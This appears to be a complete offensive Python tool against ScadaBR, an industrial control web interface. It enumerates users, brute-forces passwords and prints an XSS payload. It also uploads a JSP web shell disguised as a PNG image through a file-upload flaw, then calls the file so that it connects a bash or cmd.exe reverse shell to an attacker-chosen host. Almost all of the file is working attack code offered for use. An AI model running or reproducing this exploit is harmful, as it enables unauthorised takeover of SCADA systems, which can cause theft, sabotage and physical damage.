import requests
import argparse
import time
import sys


valid_users=[]
is_logged_in=[]

class ScadaBRuter:

   def __init__(self):
     self.debug = True

   def brute_force(self,user, password):
       with requests.Session() as s:
           data=s.post(f"http://{host}:{port}/ScadaBR/login.htm", data={"username":user,"password":password})
           if "???login.validation.noSuchUser(11)???" in data.text:
                print(f"[INFO] Username not valid: {user}")
           if "Invalid login, please try again" in data.text:
                print(f"[OK] Found username: {user}")
                if user in valid_users:
                   pass
                else:
                    valid_users.append(user)
           if "User: " in data.text:
                print(f"[***] Login Credentials: {user}:{password} [***]")
                if [user,password] in is_logged_in:
                   pass
                else:
                    is_logged_in.append([user, password])
                    exploit=input("Do you want to proceed exploiting Arbitrary File Upload? type y or n: ")
                    if (exploit == "y" and "ScadaBR - 1.0 " in data.text) or (exploit == "y" and "ScadaBR - 1.1 " in data.text):
                       print(is_logged_in)
                       print("*** EXPLOITING ScadaBR ***")
                       print("Works on ScadaBR <= 1.1")
                       if len(is_logged_in) > 1:
                       	   for i in range(0, len(is_logged_in)):
                              print(f"Credentials: {i}:{is_logged_in[i]}")
                              choice_int = int(input("Choose credentials : "))
                              if choice_int >= len(is_logged_in):
                                 logged_in=is_logged_in[0]
                              else:
                                  logged_in=is_logged_in[choice_int] 
                       if len(is_logged_in) == 1:
                           print(f"Credentials {is_logged_in[0]}")
                           logged_in = is_logged_in[0]
                       if len(is_logged_in) == 0:
                           print("No Credentials found yet")
                           exit()
                       print("***Establishing Session***")
                       scada_url = f"http://{host}:{port}/ScadaBR/view_edit.shtm"
                       c=s.get(url=scada_url)
                       scada_cookie=c.cookies.get_dict()
                       scada_header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------32124376735876620811763441977", "Origin": f"http://{host}:{port}/", "Connection": "close", "Referer": f"http://{host}:{port}/ScadaBR/view_edit.shtm", "Upgrade-Insecure-Requests": "1"}
                       scada_data_linux = "-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"view.name\"\r\n\r\n\r\n-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"view.xid\"\r\n\r\nGV_369755\r\n-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"backgroundImageMP\"; filename=\"webshell.jsp\"\r\nContent-Type: image/png\r\n\r\n <%@page import=\"java.lang.*\"%>\n<%@page import=\"java.util.*\"%>\n<%@page import=\"java.io.*\"%>\n<%@page import=\"java.net.*\"%>\n\n<%\nclass StreamConnector extends Thread {\n    InputStream is;\n    OutputStream os;\n    StreamConnector(InputStream is, OutputStream os) {\n        this.is = is;\n        this.os = os;\n    }\n    public void run() {\n        BufferedReader isr = null;\n        BufferedWriter osw = null;\n        try {\n            isr = new BufferedReader(new InputStreamReader(is));\n            osw = new BufferedWriter(new OutputStreamWriter(os));\n            char buffer[] = new char[8192];\n            int lenRead;\n            while ((lenRead = isr.read(buffer, 0, buffer.length)) > 0) {\n                osw.write(buffer, 0, lenRead);\n                osw.flush();\n            }\n        } catch (Exception e) {\n            System.out.println(\"exception: \" + e.getMessage());\n        }\n        try {\n            if (isr != null)\n                isr.close();\n            if (osw != null)\n                osw.close();\n        } catch (Exception e) {\n            System.out.println(\"exception: \" + e.getMessage());\n        }\n    }\n}\n%>\n\n<h1>Payload JSP to Reverse Shell</h1>\n<p>Run nc -l 1234 on your client (127.0.0.1) and click Connect. This JSP will start a bash shell and connect it to your nc process</p>\n<form method=\"get\">\n\tIP Address<input type=\"text\" name=\"ipaddress\" size=30 value=\"127.0.0.1\"/>\n\tPort<input type=\"text\" name=\"port\" size=10 value=\"1234\"/>\n\t<input type=\"submit\" name=\"Connect\" value=\"Connect\"/>\n</form>\n\n<%\n    String ipAddress = request.getParameter(\"ipaddress\");\n    String ipPort = request.getParameter(\"port\");\n    Socket sock = null;\n    Process proc = null;\n    if (ipAddress != null && ipPort != null) {\n        try {\n            sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\n            System.out.println(\"socket created: \" + sock.toString());\n            Runtime rt = Runtime.getRuntime();\n            proc = rt.exec(\"/bin/bash\");\n            System.out.println(\"process /bin/bash started: \" + proc.toString());\n            StreamConnector outputConnector = new StreamConnector(proc.getInputStream(), sock.getOutputStream());\n            System.out.println(\"outputConnector created: \" + outputConnector.toString());\n            StreamConnector inputConnector = new StreamConnector(sock.getInputStream(), proc.getOutputStream());\n            System.out.println(\"inputConnector created: \" + inputConnector.toString());\n            outputConnector.start();\n            inputConnector.start();\n        } catch (Exception e) {\n            System.out.println(\"exception: \" + e.getMessage());\n        }\n    }\n    if (sock != null && proc != null) {\n        out.println(\"<div class='separator'></div>\");\n        out.println(\"<p>Process /bin/bash, running as (\" + proc.toString() + \", is connected to socket \" + sock.toString() + \".</p>\");\n    }\n%>\n\n\r\n-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"upload\"\r\n\r\nUpload image\r\n-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"view.anonymousAccess\"\r\n\r\n0\r\n-----------------------------32124376735876620811763441977--\r\n"
                       scada_data_win = "-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"view.name\"\r\n\r\n\r\n-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"view.xid\"\r\n\r\nGV_369755\r\n-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"backgroundImageMP\"; filename=\"webshell.jsp\"\r\nContent-Type: image/png\r\n\r\n <%@page import=\"java.lang.*\"%>\n<%@page import=\"java.util.*\"%>\n<%@page import=\"java.io.*\"%>\n<%@page import=\"java.net.*\"%>\n\n<%\nclass StreamConnector extends Thread {\n    InputStream is;\n    OutputStream os;\n    StreamConnector(InputStream is, OutputStream os) {\n        this.is = is;\n        this.os = os;\n    }\n    public void run() {\n        BufferedReader isr = null;\n        BufferedWriter osw = null;\n        try {\n            isr = new BufferedReader(new InputStreamReader(is));\n            osw = new BufferedWriter(new OutputStreamWriter(os));\n            char buffer[] = new char[8192];\n            int lenRead;\n            while ((lenRead = isr.read(buffer, 0, buffer.length)) > 0) {\n                osw.write(buffer, 0, lenRead);\n                osw.flush();\n            }\n        } catch (Exception e) {\n            System.out.println(\"exception: \" + e.getMessage());\n        }\n        try {\n            if (isr != null)\n                isr.close();\n            if (osw != null)\n                osw.close();\n        } catch (Exception e) {\n            System.out.println(\"exception: \" + e.getMessage());\n        }\n    }\n}\n%>\n\n<h1>Payload JSP to Reverse Shell</h1>\n<p>Run nc -l 1234 on your client (127.0.0.1) and click Connect. This JSP will start a bash shell and connect it to your nc process</p>\n<form method=\"get\">\n\tIP Address<input type=\"text\" name=\"ipaddress\" size=30 value=\"127.0.0.1\"/>\n\tPort<input type=\"text\" name=\"port\" size=10 value=\"1234\"/>\n\t<input type=\"submit\" name=\"Connect\" value=\"Connect\"/>\n</form>\n\n<%\n    String ipAddress = request.getParameter(\"ipaddress\");\n    String ipPort = request.getParameter(\"port\");\n    Socket sock = null;\n    Process proc = null;\n    if (ipAddress != null && ipPort != null) {\n        try {\n            sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\n            System.out.println(\"socket created: \" + sock.toString());\n            Runtime rt = Runtime.getRuntime();\n            proc = rt.exec(\"cmd.exe /C\");\n            System.out.println(\"process cmd.exe started: \" + proc.toString());\n            StreamConnector outputConnector = new StreamConnector(proc.getInputStream(), sock.getOutputStream());\n            System.out.println(\"outputConnector created: \" + outputConnector.toString());\n            StreamConnector inputConnector = new StreamConnector(sock.getInputStream(), proc.getOutputStream());\n            System.out.println(\"inputConnector created: \" + inputConnector.toString());\n            outputConnector.start();\n            inputConnector.start();\n        } catch (Exception e) {\n            System.out.println(\"exception: \" + e.getMessage());\n        }\n    }\n    if (sock != null && proc != null) {\n        out.println(\"<div class='separator'></div>\");\n        out.println(\"<p>Process /bin/bash, running as (\" + proc.toString() + \", is connected to socket \" + sock.toString() + \".</p>\");\n    }\n%>\n\n\r\n-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"upload\"\r\n\r\nUpload image\r\n-----------------------------32124376735876620811763441977\r\nContent-Disposition: form-data; name=\"view.anonymousAccess\"\r\n\r\n0\r\n-----------------------------32124376735876620811763441977--\r\n"
                       exploit_type = input("Windows or Linux? win or lin: ")
                       if exploit_type == "win":
                          print("Windows payload")
                          scada_data=scada_data_win
                       if exploit_type == "linux":
                          print("Linux payload")
                          scada_data=scada_data_linux
                       if exploit_type != "win" or exploit_type != "lin":
                          print("Invalid option, choosing linux payload")
                          scada_data=scada_data_linux
                       print("[INFO] Starting the upload!")
                       upload_payload = s.post(scada_url,headers=scada_header,cookies=scada_cookie,data=scada_data)
                       time.sleep(10)
                       if upload_payload.status_code == 200:
                       	  print("!!!SUCCESS!!!")
                       else:
                            print("ERROR")
                       print("[INFO] File Sent...")
                       for i in range(0, 1000):
                           file_url = f"http://{host}:{port}/ScadaBR/uploads/{i}.jsp?ipaddress={rev_host}&port={rev_port}&Connect=Connect"
                           file_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
                           r = s.get(url=file_url, headers=file_headers)
                           time.sleep(3)
                       exit()
                    else:
                        print(f"CREDENTIALS: {is_logged_in}")
                        exit()

   def get_user(self):
       with open("usernames.txt", "r") as usernames:
            usernames=usernames.readlines()
            for username in usernames:
                username=username.replace('\n', '')
                self.brute_force(username, 'root')
   def get_password(self, user):
       with open("passwords.txt", "r") as passwords:
            passwords = passwords.readlines()
            for password in passwords:
                password = password.replace('\n', '') 
                print(f"[INFO] Trying password: {password}")
                self.brute_force(user, password)
   def generate_xss_payload(self):
      return 'pwn3d"><script> alert(1); </script>'

global host
global port
global rev_host
global rev_port

parser=argparse.ArgumentParser()
parser.add_argument('--ip', type=str, help="ip", required=True)
parser.add_argument('--port', type=int, help="port", required=True)
parser.add_argument('--revip', type=str, help="reverse shell ip [optional]", required=False)
parser.add_argument('--revport', type=int, help="reverse shell port [optional]", required=False)
args = parser.parse_args()

host=args.ip
port=args.port
rev_host = args.revip
rev_port = args.revport

br=ScadaBRuter()
print("""
 #####                              ######  ######                      
#     #  ####    ##   #####    ##   #     # #     # #    # ##### ###### 
#       #    #  #  #  #    #  #  #  #     # #     # #    #   #   #      
 #####  #      #    # #    # #    # ######  ######  #    #   #   #####  
      # #      ###### #    # ###### #     # #   #   #    #   #   #      
#     # #    # #    # #    # #    # #     # #    #  #    #   #   #      
 #####   ####  #    # #####  #    # ######  #     #  ####    #   ###### 
""")
while True:
   print("""
1)Enumerate users
2)Display valid\logged in users
3)Dictionary Attack
4)XSS Payload
5)Exit
""")
   choice = input("$> ")
   if choice == "1":
      br.get_user()
   elif choice == "2":
      print(f"Valid users found: {valid_users}")
      print(f"Managed to log in with: {is_logged_in}")
   elif choice == "3":
      for user in valid_users:
          br.get_password(user)
   elif choice == "4":
      print("XSS Payload Generator")
      print(br.generate_xss_payload())
   elif choice == "5":
      exit()
   else:
       print("Check options")
